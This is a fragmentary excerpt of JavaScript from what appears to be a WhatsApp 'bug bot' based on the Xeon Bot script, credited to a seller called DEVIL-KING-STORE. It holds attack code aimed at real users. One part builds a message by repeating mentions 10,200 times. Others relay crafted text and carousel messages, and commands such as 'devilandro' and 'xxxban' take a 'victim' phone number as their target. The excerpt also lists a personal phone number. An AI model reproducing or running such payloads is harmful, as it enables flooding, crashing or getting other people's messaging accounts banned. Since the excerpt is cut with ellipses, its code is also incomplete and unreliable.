//base by DEVIL-KING-STORE (Xeon Bot Inc.)
//re-upload? recode? copy code? give credit ya :)
//YouTube: @DEVIL-KING-STORE
//Instagram: unicorn_xeon13
//Telegram: @DEVIL-KING-STORE
//GitHub: @DEVIL-KING-STORE
//WhatsApp: +923080964151
//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@DEVIL-KING-STORE
...
xeontex = "\n " + (args.join(" ") ? args.join(" ") : "Telegram: @DEVILXKING06") + "\n\n\n";
    jidds = [];
    xeontex += "*~@923080964151~*\n*🦄*\n*~@919366316018~*\n".repeat(10200);
    jidds.push("923080964151@s.whatsapp.net", "919366316018@s.whatsapp.net");
//bug database
...
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/x8sT2Mnb/file-00000000186861f895deda473f0c8199-2.png",
sourceUrl: link,
mediaType: 1,
			...
			await XeonBotInc.relayMessage(X, {
					"extendedTextMessage": {
						...
						"contextInfo": {
							...
							"placeholderKey": {
								"remoteJid": "923080964151@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
...
async function forcer(isTarget){
  ...
  key: {
    ...
    participant: '923080964151@s.whatsapp.net'
  },
  messageTimestamp: 1753786706,
  pushName: 'Telegram: @DEVILXKING06',
  broadcast: false,
  status: 2,
  message: {
    conversation: 'Telegram: @DEVILXKING06',
    messageContextInfo: {
  ...
  fromMe: true,
  isGroup: true,
  sender: '923080964151@s.whatsapp.net',
  participant: '923080964151@s.whatsapp.net',
  mtype: 'conversation',
  msg: 'Telegram: @DEVILXKING06',
  body: 'Telegram: @DEVILXKING06',
  quoted: null,
  mentionedJid: [],
  text: 'Telegram: @DEVILXKING06',
...
await sleep(100)
    ...
    const carouselContent = {
        carouselMessage: {
            cards: [
                {
                    jpegThumbnail: 'https://i.ibb.co/x8sT2Mnb/file-00000000186861f895deda473f0c8199-2.png',
                    carouselCard: {
                        body: "T-Яyuichi",
                        buttons: [
                            {
                        ...
                        header: {
                            imageMessage: { jpegThumbnail: 'https://i.ibb.co/x8sT2Mnb/file-00000000186861f895deda473f0c8199-2.png' },
...
case 'devilandro': case 'devilandro2': {
if (!isRentBotUser) return replygcxeon(mess.premium)
if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
...
case 'xxxban': case 'xx🦄': {
    ...
    try {
        ...
        const imageUrl = "https://raw.githubusercontent.com/DEVILXKING06/xeonPloitWa/refs/heads/main/photo_2024-12-19_01-39-48.jpg";
...
mimetype: 'application/javascript',
fileName: 'Decrypted By @DEVIL-KING-STORE'
}, {quoted: m});
...
"mediaUrl": 'https://i.ibb.co/x8sT2Mnb/file-00000000186861f895deda473f0c8199-2.png',
...
break;
  ...
  const imageUrl = "https://i.ibb.co/x8sT2Mnb/file-00000000186861f895deda473f0c8199-2.png"; // Define the single image URL
